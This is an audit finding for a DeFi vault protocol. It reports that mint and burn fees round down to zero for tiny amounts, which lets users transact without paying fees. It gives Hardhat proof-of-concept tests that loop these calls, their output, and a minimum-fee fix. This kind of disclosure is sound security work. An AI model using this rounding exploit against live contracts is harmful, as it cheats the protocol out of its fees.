## [Medium] Users can Mint and Burn small quantities without paying fees

### Severity

Medium Risk

### Date Modified

Jan 8th, 2024

### Summary

The protocol has no minimum fee per transaction. If the result of the fee calculation is 0, users can mint and burn without paying a fee. This happens for small amounts, but the user can create a loop to continue minting/burning for free.

### Vulnerability Details (PoC)

To prove the vulnerability, we created 2 tests: 1 for minting and 1 for burning. In both, the fees to be paid are 0. For example, in the burning test, it is not even necessary to `approve` a transaction to the vault, as there is no fee transaction.

First, set the timeout to 0 in the hardhat.config.js

```
module.exports = {
  solidity: "0.8.17",
  mocha: {
    timeout: 0,
  },
};

```

Execute the test. We are using small quantities as this is just a test:

```
describe.only("Audit Test: ", async () => {
    it("Mint without paying fees", async () => {
      // 1. Set the variables
      const collateral = ethers.utils.parseEther("1");
      const mintedValue = ethers.utils.parseEther("0.0000000000000001");

      const mintingFee = mintedValue.mul(PROTOCOL_FEE_RATE).div(HUNDRED_PC);

      console.log("mintingFee: ", mintingFee);

      // 2. User send collateral
      await user.sendTransaction({ to: Vault.address, value: collateral });

      // 3. Mint Euros
      const mintValue = ethers.utils.parseEther("0.0000000000001");
      for (let i = 0; i < mintValue; i++) {
        await Vault.connect(user).mint(user.address, mintedValue);
      }

      // 4. Balances after minting:
      let minted = (await Vault.status()).minted;

      console.log("user balance: ", await EUROs.balanceOf(user.address));

      expect(mintingFee).to.equal(0);
      expect(await EUROs.balanceOf(user.address)).to.equal(minted);
    });

    it("Burn without paying fees", async () => {
      // 1. Set the variables
      const collateral = ethers.utils.parseEther("1");
      const burnedValue = ethers.utils.parseEther("0.0000000000000001");

      const burningFee = burnedValue.mul(PROTOCOL_FEE_RATE).div(HUNDRED_PC);

      console.log("burningFee: ", burningFee);

      // 2. User send collateral
      await user.sendTransaction({ to: Vault.address, value: collateral });

      // 3. Mint Euros
      await Vault.connect(user).mint(user.address, collateral);

      // 4. Burn: NO APPROVE NEEDED!!!
      const userBalance = await EUROs.balanceOf(user.address);
      const burnValue = ethers.utils.parseEther("0.0000000000001");
      for (let i = 0; i < burnValue; i++) {
        await Vault.connect(user).burn(burnedValue);
      }

      let finalBurnedValue = burnedValue.mul(burnValue);

      console.log("user balance: ", await EUROs.balanceOf(user.address));

      // 7. Check
      const result = userBalance.sub(finalBurnedValue);

      expect(burningFee).to.equal(0);
      expect(await EUROs.balanceOf(user.address)).to.equal(result);
    });
  });
```

```
➜  2023-12-the-standard git:(main) ✗ npx hardhat test


  SmartVault
    Audit Test:
mintingFee:  BigNumber { value: "0" }
user balance:  BigNumber { value: "10000000" }
      ✔ Mint without paying fees (3115568ms)
burningFee:  BigNumber { value: "0" }
user balance:  BigNumber { value: "999999999990000000" }
      ✔ Burn without paying fees (2438366ms)

```

### Impact

Allowing users to mint or burn without paying fees is a dangerous situation that imaginative developers could use to their advantage, as they could find ways to do the perfect script to operate in the protocol for free.

### Tools Used

Hardhat and manual check.

### Recommendations

It is relatively easy to set a minimum fee to be paid if the fee is 0:

```
function mint(address _to, uint256 _amount) external onlyOwner ifNotLiquidated {
    uint256 fee = _amount * ISmartVaultManagerV3(manager).mintFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
    if (fee == 0) {
        fee = MIN_FEE;
    }
...(continue)
```

Another option, similar to `maxMintable`, is to set a `minMintable` and a `minBurnable`.
